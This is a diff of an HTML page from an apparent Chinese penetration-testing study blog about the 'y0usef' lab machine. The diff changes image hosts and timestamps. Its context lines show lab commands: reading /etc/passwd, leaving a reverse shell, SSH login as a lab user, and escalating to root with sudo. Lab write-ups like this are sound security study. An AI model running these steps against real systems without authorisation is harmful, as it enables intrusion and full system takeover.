 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cat</span> /etc/passwd</span></span><br></pre></td></tr></table></figure>
@@ -2970,16 +2970,16 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 <p>退出反弹shell，在kali的shell使用以下指令：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ssh yousef@10.0.2.5</span></span><br></pre></td></tr></table></figure>
 
-<img src="https://img-blog.csdnimg.cn/9742303394ec4a7f9fa562a3e944150d.png#pic_center" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/9742303394ec4a7f9fa562a3e944150d.png#pic_center" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220921142200653" style="zoom:67%;" /> 
+<img src="https://blog.kekwy.com/media/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220921142200653.png" class="lazyload" data-srcset="https://blog.kekwy.com/media/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220921142200653.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220921142200653" style="zoom:67%;" /> 
 
 <p> 成功登入yousef后，查看该用户所在的用户组：</p>
 <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">id</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="https://img-blog.csdnimg.cn/146d29498c314fbca09b7556c687ac0d.png#pic_center" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/146d29498c314fbca09b7556c687ac0d.png#pic_center" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220921142413525"> </p>
+<p><img src="https://blog.kekwy.com/media/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220921142413525.png" class="lazyload" data-srcset="https://blog.kekwy.com/media/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220921142413525.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220921142413525"> </p>
 <p>发现该用户属于sudo组，查看该用户可执行的指令：</p>
 <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo -l</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://img-blog.csdnimg.cn/1391df72bbbe46a8bf20a364fc12a148.png#pic_center" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/1391df72bbbe46a8bf20a364fc12a148.png#pic_center" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220921142645249"> </p>
+<p><img src="https://blog.kekwy.com/media/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220921142645249.png" class="lazyload" data-srcset="https://blog.kekwy.com/media/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220921142645249.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220921142645249"> </p>
 <p>发现该用户可以执行所有的系统指令，则我们可以直接切换为root身份：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo -i</span></span><br></pre></td></tr></table></figure>
 
@@ -3014,7 +3014,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     <div class='new-meta-box'>
       
         
-          <div class="new-meta-item date" itemprop="dateModified" datetime="2022-09-27T12:47:49+08:00">
+          <div class="new-meta-item date" itemprop="dateModified" datetime="2022-09-27T15:00:00+08:00">
   <a class='notlink'>
     <i class="fa-solid fa-edit fa-fw" aria-hidden="true"></i>
     <p>更新于：2022年9月27日</p>
@@ -4332,7 +4332,7 @@ volantis.pjax.push(()=>{_hmt.push(['_trackPageview', document.location.pathname]
 </script>
 
 
-  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"铃的杂货铺","url":"http://blog.kekwy.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"可弟WZ铃号机","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://blog.kekwy.com/","sameAs":["https://github.com/volantis-x"],"description":"喜欢夏天的无名之辈"},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"http://blog.kekwy.com/","name":"铃的杂货铺"}},{"@type":"ListItem","position":2,"item":{"@id":"http://blog.kekwy.com/categories/渗透测试学习笔记/","name":"渗透测试学习笔记"}},{"@type":"ListItem","position":3,"item":{"@id":"http://blog.kekwy.com/渗透测试学习笔记/","name":"渗透测试学习笔记lab1【y0usef】"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"铃的杂货铺","url":"http://blog.kekwy.com/","keywords":null,"description":"喜欢夏天的无名之辈","author":{"@type":"Person","name":"可弟WZ铃号机","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://blog.kekwy.com/","description":"喜欢夏天的无名之辈"},"publisher":{"@type":"Organization","name":"铃的杂货铺","url":"http://blog.kekwy.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"http://blog.kekwy.com?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","headline":"渗透测试学习笔记lab1【y0usef】","description":"喜欢夏天的无名之辈","inLanguage":"zh-CN","mainEntityOfPage":{"@type":"WebPage","@id":"http://blog.kekwy.com/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},"author":{"@type":"Person","name":"可弟WZ铃号机","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://blog.kekwy.com/"},"publisher":{"@type":"Organization","name":"铃的杂货铺","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"http://blog.kekwy.com/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/","wordCount":0,"datePublished":"2022-09-27T04:44:31.000Z","dateModified":"2022-09-27T04:47:49.857Z","articleSection":"渗透测试学习笔记","keywords":"学习,Kali,网络,安全","image":{"@type":"ImageObject","url":"/media/渗透测试学习笔记/kali-ascii-16x9.png","width":1024,"height":768}}]</script>
+  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"铃的杂货铺","url":"http://blog.kekwy.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"可弟WZ铃号机","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://blog.kekwy.com/","sameAs":["https://github.com/volantis-x"],"description":"喜欢夏天的无名之辈"},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"http://blog.kekwy.com/","name":"铃的杂货铺"}},{"@type":"ListItem","position":2,"item":{"@id":"http://blog.kekwy.com/categories/渗透测试学习笔记/","name":"渗透测试学习笔记"}},{"@type":"ListItem","position":3,"item":{"@id":"http://blog.kekwy.com/渗透测试学习笔记/","name":"渗透测试学习笔记lab1【y0usef】"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"铃的杂货铺","url":"http://blog.kekwy.com/","keywords":null,"description":"喜欢夏天的无名之辈","author":{"@type":"Person","name":"可弟WZ铃号机","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://blog.kekwy.com/","description":"喜欢夏天的无名之辈"},"publisher":{"@type":"Organization","name":"铃的杂货铺","url":"http://blog.kekwy.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"http://blog.kekwy.com?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","headline":"渗透测试学习笔记lab1【y0usef】","description":"喜欢夏天的无名之辈","inLanguage":"zh-CN","mainEntityOfPage":{"@type":"WebPage","@id":"http://blog.kekwy.com/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},"author":{"@type":"Person","name":"可弟WZ铃号机","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://blog.kekwy.com/"},"publisher":{"@type":"Organization","name":"铃的杂货铺","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"http://blog.kekwy.com/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/","wordCount":0,"datePublished":"2022-09-27T04:44:31.000Z","dateModified":"2022-09-27T07:00:00.851Z","articleSection":"渗透测试学习笔记","keywords":"学习,Kali,网络,安全","image":{"@type":"ImageObject","url":"/media/渗透测试学习笔记/kali-ascii-16x9.png","width":1024,"height":768}}]</script>
 
 
 
